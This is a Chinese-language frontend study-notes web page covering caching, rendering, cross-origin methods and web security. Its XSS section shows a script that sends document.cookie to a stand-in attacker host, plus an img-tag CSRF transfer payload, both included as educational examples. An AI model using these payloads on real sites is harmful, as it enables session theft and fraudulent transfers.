<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>通识 | Note</title>
    <meta name="generator" content="VuePress 1.8.2">
    <link rel="icon" href="/logo.png">
    <meta name="description" content="my note">
    
    <link rel="preload" href="/assets/css/0.styles.e4d8b86b.css" as="style"><link rel="preload" href="/assets/js/app.1713fb38.js" as="script"><link rel="preload" href="/assets/js/2.8a78f676.js" as="script"><link rel="preload" href="/assets/js/3.77fa144c.js" as="script"><link rel="prefetch" href="/assets/js/10.eb91d753.js"><link rel="prefetch" href="/assets/js/11.2cd846a1.js"><link rel="prefetch" href="/assets/js/12.7a6b84b0.js"><link rel="prefetch" href="/assets/js/13.bdf4a3f8.js"><link rel="prefetch" href="/assets/js/14.4d590268.js"><link rel="prefetch" href="/assets/js/4.1115eb0e.js"><link rel="prefetch" href="/assets/js/5.4468360e.js"><link rel="prefetch" href="/assets/js/6.b0128d95.js"><link rel="prefetch" href="/assets/js/7.6b608294.js"><link rel="prefetch" href="/assets/js/8.2a04e0d0.js"><link rel="prefetch" href="/assets/js/9.4450ef0b.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e4d8b86b.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Note</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"> <a href="https://github.com/GreenHandLittleWhite/GreenHandLittleWhite.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"> <a href="https://github.com/GreenHandLittleWhite/GreenHandLittleWhite.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><a href="/" aria-current="page" class="sidebar-link">Welcome</a></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>Note</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/note/JavaScript.html" class="sidebar-link">JavaScript</a></li><li><a href="/note/Frame.html" class="sidebar-link">框架</a></li><li><a href="/note/Vue.html" class="sidebar-link">Vue</a></li><li><a href="/note/React.html" class="sidebar-link">React</a></li><li><a href="/note/Node.html" class="sidebar-link">Node</a></li><li><a href="/note/General.html" aria-current="page" class="active sidebar-link">通识</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/General.html#命令式编程与声明式编程" class="sidebar-link">命令式编程与声明式编程</a></li><li class="sidebar-sub-header"><a href="/note/General.html#前端性能优化" class="sidebar-link">前端性能优化</a></li><li class="sidebar-sub-header"><a href="/note/General.html#缓存" class="sidebar-link">缓存</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/General.html#缓存位置" class="sidebar-link">缓存位置</a></li><li class="sidebar-sub-header"><a href="/note/General.html#缓存策略" class="sidebar-link">缓存策略</a></li><li class="sidebar-sub-header"><a href="/note/General.html#缓存机制" class="sidebar-link">缓存机制</a></li><li class="sidebar-sub-header"><a href="/note/General.html#选择缓存策略" class="sidebar-link">选择缓存策略</a></li><li class="sidebar-sub-header"><a href="/note/General.html#用户行为触发的缓存策略" class="sidebar-link">用户行为触发的缓存策略</a></li></ul></li><li class="sidebar-sub-header"><a href="/note/General.html#输入-url-到页面渲染过程" class="sidebar-link">输入 url 到页面渲染过程</a></li><li class="sidebar-sub-header"><a href="/note/General.html#跨域" class="sidebar-link">跨域</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/General.html#jsonp" class="sidebar-link">JSONP</a></li><li class="sidebar-sub-header"><a href="/note/General.html#document-domain" class="sidebar-link">document.domain</a></li><li class="sidebar-sub-header"><a href="/note/General.html#postmessage" class="sidebar-link">postMessage</a></li><li class="sidebar-sub-header"><a href="/note/General.html#cors" class="sidebar-link">CORS</a></li></ul></li><li class="sidebar-sub-header"><a href="/note/General.html#web-安全" class="sidebar-link">web 安全</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/General.html#xss" class="sidebar-link">XSS</a></li><li class="sidebar-sub-header"><a href="/note/General.html#csrf" class="sidebar-link">CSRF</a></li></ul></li></ul></li><li><a href="/note/HTTP.html" class="sidebar-link">HTTP</a></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="通识"><a href="#通识" class="header-anchor">#</a> 通识</h1> <h2 id="命令式编程与声明式编程"><a href="#命令式编程与声明式编程" class="header-anchor">#</a> 命令式编程与声明式编程</h2> <p>命令式编程（Imperative）：通过详细的命令告诉机器如何去处理一件事情以达到你想要的结果</p> <p>声明式编程（ Declarative）：只告诉你想要的结果，机器自己摸索过程</p> <p>举个打车的例子：</p> <p>命令式编程：详细描述具体步骤</p> <ul><li>这个路口直行</li> <li>下个路口左转</li> <li>往前开 500 米</li></ul> <p>声明式编程：只告诉结果</p> <ul><li>请到 XX 医院</li></ul> <h2 id="前端性能优化"><a href="#前端性能优化" class="header-anchor">#</a> 前端性能优化</h2> <ul><li>路由懒加载（从静态引用方式改为函数的形式动态引入，把各自的路由文件分别打包，只有在解析给定的路由时，才会下载路由组件）</li> <li>按需加载（例如 vue-cli3 安装 babel-plugin-component，按需加载 element-ui）</li> <li>避免重复依赖（webpack4 的 SplitChunks，把多次复用抽离出来）</li> <li>文件压缩 （js、css、图片），减少请求返回的数据量</li> <li>gzip（需要服务器做相应的配置，如果发送请求的浏览器支持 gzip，就发送给它 gzip 格式的文件）</li> <li>css 拆分（css 拆分后体积变小，但文件数量增加，例如首页请求多份 css 文件时会花费不少请求时间，是否使用看具体情况）</li> <li>静态资源 cdn 分发：客户端可以通过最佳的网络链路加载静态资源</li> <li>缓存</li> <li>优化资源加载（css 放在顶部（head 中）：优先渲染、js 放在底部：避免阻塞、减少 DOM 元素数量）</li></ul> <p>参考：</p> <ul><li><a href="https://segmentfault.com/a/1190000019499007" target="_blank" rel="noopener noreferrer">前端性能优化的三个维度<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://www.cnblogs.com/xiaohuochai/p/9178390.html" target="_blank" rel="noopener noreferrer">前端性能优化的七大手段<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul> <h2 id="缓存"><a href="#缓存" class="header-anchor">#</a> 缓存</h2> <h3 id="缓存位置"><a href="#缓存位置" class="header-anchor">#</a> 缓存位置</h3> <p>缓存位置上来说分为四种，并且各自有优先级，当依次查找缓存且都没有命中的时候，才会去请求网络</p> <h4 id="_1-service-worker"><a href="#_1-service-worker" class="header-anchor">#</a> 1.Service Worker</h4> <p>Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。传输协议必须为 HTTPS，Service Worker 的缓存与浏览器其他内建的缓存机制不同，它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的</p> <h4 id="_2-memory-cache"><a href="#_2-memory-cache" class="header-anchor">#</a> 2.Memory Cache</h4> <p>内存中的缓存，读取高效，但持续时间短，一旦关闭 Tab 页面，内存中的缓存也就被释放了</p> <h4 id="_3-disk-cache"><a href="#_3-disk-cache" class="header-anchor">#</a> 3.Disk Cache</h4> <p>磁盘中的缓存，读取速度慢，但比 Memory Cache 容量和存储实效性上好</p> <h4 id="_4-push-cache"><a href="#_4-push-cache" class="header-anchor">#</a> 4.Push Cache</h4> <p>HTTP/2 中的内容，当前三种都没命中时，才会被使用。只在会话（Session）中存在，一旦会话结束就被释放，并且缓存时间也很短暂</p> <h3 id="缓存策略"><a href="#缓存策略" class="header-anchor">#</a> 缓存策略</h3> <p>分为强缓存和协商缓存，缓存策略都是通过设置 HTTP Header 来实现的</p> <h4 id="强缓存"><a href="#强缓存" class="header-anchor">#</a> 强缓存</h4> <p>浏览器在规定时间内，不用询问服务器，直接使用本地缓存，请求返回状态码 200，Size 显示 from disk cache 或 from memory cache，可以通过设置两种 HTTP Header 实现：Expires 和 Cache-Control</p> <h5 id="_1-expires"><a href="#_1-expires" class="header-anchor">#</a> 1.Expires</h5> <p>缓存过期时间，用来指定资源到期的时间（绝对时间），是服务器端的具体的时间点，需结合 Last-modified 使用，Expires 是 HTTP/1 的产物，受限于本地时间，如果修改了本地时间（或者客户端时间与服务端时间不同步），可能会造成缓存失效</p> <h5 id="_2-cache-control"><a href="#_2-cache-control" class="header-anchor">#</a> 2.Cache-Control</h5> <p>HTTP/1.1 出的，它的值是一个相对时间，在这个相对时间内用强缓存，比如当 Cache-Control:max-age=300 时，则代表在这个请求正确返回时间（浏览器也会记录下来）的 5 分钟内再次加载资源，就会命中强缓存，Cache-Control 优先级高于 Expires</p> <p>Cache-Control 可以在请求头或者响应头中设置，并且可以组合使用多种指令</p> <p><img src="/assets/img/Cache-Control.d1f49e8b.png" alt="An image"> <img src="/assets/img/Cache-Control2.1c036292.png" alt="An image"></p> <h4 id="协商缓存"><a href="#协商缓存" class="header-anchor">#</a> 协商缓存</h4> <p>协商缓存就是强制缓存失效后，浏览器会向服务端发起 http 请求，然后服务端告诉浏览器文件未改变，让浏览器使用本地缓存（浏览器会带着 if-Modified-Since 字段询问服务器是否使用缓存，服务器根据传来的 if-Modified-Since 时间来判断是否需要使用缓存），返回状态码 304</p> <h5 id="_1-last-modified-和-if-modified-since"><a href="#_1-last-modified-和-if-modified-since" class="header-anchor">#</a> 1.Last-Modified 和 If-Modified-Since</h5> <p>浏览器在第一次访问资源时，服务器返回资源的同时，在响应头中添加 Last-Modified，值是这个资源在服务器上的最后修改时间，浏览器下一次请求这个资源，浏览器检测到有 Last-Modified 这个 header，于是添加 If-Modified-Since 这个 header，值就是 Last-Modified 中的值；服务器再次收到这个资源请求，会根据 If-Modified-Since 中的值与服务器中这个资源的最后修改时间对比，如果没有变化，返回 304 和空的响应体，直接从缓存读取，如果 If-Modified-Since 的时间小于服务器中这个资源的最后修改时间，说明文件有更新，于是返回新的资源文件和 200</p> <p>存在问题：</p> <p>1.如果本地打开缓存文件，即使没有对文件进行修改，但还是会造成 Last-Modified 被修改</p> <p>2.Last-Modified 只能以秒计时，如果在不可感知的时间内修改完成文件，那么服务端会认为资源还是命中了，不会返回正确的资源</p> <h5 id="_2-etag-和-if-none-match"><a href="#_2-etag-和-if-none-match" class="header-anchor">#</a> 2.ETag 和 If-None-Match</h5> <p>针对 Last-Modified 存在的问题，HTTP / 1.1 出现了 ETag 和 If-None-Match</p> <p>Etag 是服务器响应请求时，返回当前资源文件的一个唯一标识(由服务器生成)，只要资源有变化，Etag 就会重新生成</p> <p>浏览器在下一次加载资源向服务器发送请求时，会将上一次返回的 Etag 值放到请求头里的 If-None-Match 里，服务器只需要比较客户端传来的 If-None-Match 跟自己服务器上该资源的 ETag 是否一致，就能很好地判断资源相对客户端而言是否被修改过了</p> <p>ETag 优先级比 Last-Modified 高</p> <h3 id="缓存机制"><a href="#缓存机制" class="header-anchor">#</a> 缓存机制</h3> <p>强制缓存优先于协商缓存进行，若强制缓存(Expires 和 Cache-Control)生效则直接使用缓存，若不生效则进行协商缓存(Last-Modified / If-Modified-Since 和 Etag / If-None-Match)，协商缓存由服务器决定是否使用缓存，若协商缓存失效，那么代表该请求的缓存失效，返回 200，重新返回资源和缓存标识，再存入浏览器缓存中；生效则返回 304，继续使用缓存</p> <p><img src="/assets/img/cache.e103e6be.png" alt="An image"></p> <h3 id="选择缓存策略"><a href="#选择缓存策略" class="header-anchor">#</a> 选择缓存策略</h3> <ul><li>不需要缓存的资源，可以使用 Cache-control: no-store ，表示该资源不需要缓存</li> <li>频繁变动的资源，可以使用 Cache-Control: no-cache 并配合 ETag 或者 Last-Modified 来验证资源是否有效，虽然不能节省请求数量，但是能显著减少响应数据大小</li> <li>不常变化的资源，可以给它们的 Cache-Control 配置一个很大的 max-age=31536000（一年）<code>Cache-Control: max-age=31536000</code>，这样浏览器之后请求相同的 URL 会命中强制缓存。而为了解决更新的问题，就需要在文件名（或者路径）中添加 hash，版本号等动态字符，之后更改动态字符，从而达到更改引用 URL 的目的，让之前的强制缓存失效 (其实并未立即失效，只是不再使用了而已）。</li></ul> <h3 id="用户行为触发的缓存策略"><a href="#用户行为触发的缓存策略" class="header-anchor">#</a> 用户行为触发的缓存策略</h3> <ul><li>打开网页，地址栏输入地址——查找 disk cache 中是否有匹配。如有则使用；如没有则发送网络请求</li> <li>普通刷新（F5）——因为 Tab 并没有关闭，因此 memory cache 是可用的，会被优先使用(如果匹配的话)，其次才是 disk cache</li> <li>强制刷新 (Ctrl + F5）——浏览器不使用缓存，因此发送的请求头部均带有 Cache-control:no-cache（为了兼容，还带了 Pragma:no-cache），服务器直接返回 200 和最新内容</li></ul> <p>参考：</p> <ul><li><a href="https://www.jianshu.com/p/54cc04190252" target="_blank" rel="noopener noreferrer">深入理解浏览器的缓存机制<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul> <h2 id="输入-url-到页面渲染过程"><a href="#输入-url-到页面渲染过程" class="header-anchor">#</a> 输入 url 到页面渲染过程</h2> <p>1.读取缓存，搜索自身的 DNS 缓存。(如果 DNS 缓存中找到 IP 地址就跳过了接下来查找 IP 地址步骤，直接访问该 IP 地址。)</p> <p>2.DNS 解析，通过域名查询到具体的 IP</p> <p>3.与服务器建立连接（tcp 三次握手=&gt;浏览器发送 http 请求）(浏览器获得完整的服务器 IP 地址后，域名解析环节完成。之后，浏览器通过 IP 地址查找到对应的服务器，并将用户发起的 http 请求发送给服务器。)</p> <p>4.服务器处理并返回 http 报文</p> <p>5.浏览器开始解析文件（HTML、CSS、JS）</p> <p>6.构建 DOM 树、构建 CSSOM 树（CSS 规则树）、解析 JS</p> <p>7.结合 DOM 树和 CSS 规则树，生成渲染树（Render 树），根据渲染树计算每一个节点的信息，根据计算好的信息绘制页面</p> <p>8.调用 GPU 绘制，合成图层，将内容显示在屏幕上了（6、7、8: 构建 DOM 树 -&gt; 渲染 -&gt; 布局 -&gt; 绘制）</p> <p>9.断开连接：TCP 四次挥手</p> <p><img src="/assets/img/render.dc073e6d.png" alt="An image"></p> <p>参考：</p> <ul><li><a href="https://dailc.github.io/2018/03/12/whenyouenteraurl.html" target="_blank" rel="noopener noreferrer">https://dailc.github.io/2018/03/12/whenyouenteraurl.html<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://github.com/skyline75489/what-happens-when-zh_CN" target="_blank" rel="noopener noreferrer">当···时发生了什么？<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul> <h2 id="跨域"><a href="#跨域" class="header-anchor">#</a> 跨域</h2> <h3 id="jsonp"><a href="#jsonp" class="header-anchor">#</a> JSONP</h3> <p>在 HTML 标签里，一些标签比如 script、img 这样的获取资源的标签是没有跨域限制的，JSONP 使用简单且兼容性不错，但是只限于 get 请求</p> <p>例如通过 <code>&lt;script&gt;</code> 标签指向一个需要访问的地址并提供一个回调函数来接收数据</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://domain/api?param1=a&amp;param2=b&amp;callback=jsonp<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">function</span> <span class="token function">jsonp</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="document-domain"><a href="#document-domain" class="header-anchor">#</a> document.domain</h3> <p>该方式只能用于二级域名相同的情况下（主域名相同，子域名不同），比如 a.test.com 和 b.test.com 适用于该方式</p> <p>只需要给页面添加 document.domain = 'test.com' 表示二级域名都相同就可以实现跨域</p> <h3 id="postmessage"><a href="#postmessage" class="header-anchor">#</a> postMessage</h3> <p>这种方式通常用于获取嵌入页面中的第三方页面数据。一个页面发送消息，另一个页面判断来源并接收消息</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 发送消息端</span>
window<span class="token punctuation">.</span>parent<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token string">'http://test.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 接收消息端</span>
<span class="token keyword">var</span> mc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MessageChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
mc<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> origin <span class="token operator">=</span> event<span class="token punctuation">.</span>origin <span class="token operator">||</span> event<span class="token punctuation">.</span>originalEvent<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>origin <span class="token operator">===</span> <span class="token string">'http://test.com'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'验证通过'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="cors"><a href="#cors" class="header-anchor">#</a> CORS</h3> <p>服务端设置 Access-Control-Allow-Origin</p> <p>参考：</p> <ul><li><a href="https://yuchengkai.cn/docs/frontend/browser.html#%E8%B7%A8%E5%9F%9F" target="_blank" rel="noopener noreferrer">https://yuchengkai.cn/docs/frontend/browser.html#%E8%B7%A8%E5%9F%9F<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://segmentfault.com/a/1190000015597029" target="_blank" rel="noopener noreferrer">不要再问我跨域的问题了<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul> <h2 id="web-安全"><a href="#web-安全" class="header-anchor">#</a> web 安全</h2> <h3 id="xss"><a href="#xss" class="header-anchor">#</a> XSS</h3> <p>跨站脚本攻击（cross-site scripting），攻击者通过某种方式将恶意代码注入到网页上，然后其他用户观看到被注入的页面内容后会受到特定攻击</p> <h4 id="攻击手段"><a href="#攻击手段" class="header-anchor">#</a> 攻击手段：</h4> <ol><li>劫持 cookie</li></ol> <p>页面中有一个评论输入，输入后会因为后台的漏洞，没有过滤特殊字符，直接明文保存到数据库中，然后展示到网页时直接展示明文数据，例如：</p> <div class="language-html extra-class"><pre class="language-html"><code>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>saveComment.jsp<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    请输入评论内容：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>content<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>确认<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>然后攻击者分析后，输入</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://www.attackpage.com/record?secret='</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>由于没有过滤脚本，那么其它用户登陆后，在看到这篇文章时就会自动将他们的 cookie 信息都发送到了攻击者的服务器。
攻击者可以在 cookie（譬如 jsessionid 对应的 session）有效期内拿它们冒充用户操作。</p> <p>需要注意，这里和 CSRF 的区别是，这里是拿到了 cookie 后主动冒充用户的，而 CSRF 中根本就不知 cookie，仅利用浏览器的隐式校验方式冒充用户</p> <ol start="2"><li>伪造会话（基于 XSS 实现 CSRF）</li></ol> <p>同样是上面评论页面的示例</p> <p>攻击者输入</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.bank.example/transfer?toBankId=hello&amp;amount=1000000<span class="token punctuation">&quot;</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>0<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>0<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre></div><p>然后，接下来发生的故事就和 CSRF 中提到的一致。这种情况就是基于 XSS 而开展的 CSRF，也有人喜欢称之为 XSRF</p> <p>需要注意，这里并没有自己拿到 cookie，而是 CSRF 中提到的利用浏览器的隐式验证机制来冒充用户。</p> <ol start="3"><li>恶意代码执行</li></ol> <p>其实上面的 cookie 劫持以及会话伪造都算是恶意代码执行，为了区别，这里就专指前端的流氓 JS。</p> <p>譬如前面的评论中的输入可以是：</p> <p>市面上盛行的网页游戏弹窗等
干脆直接让这个页面卡死
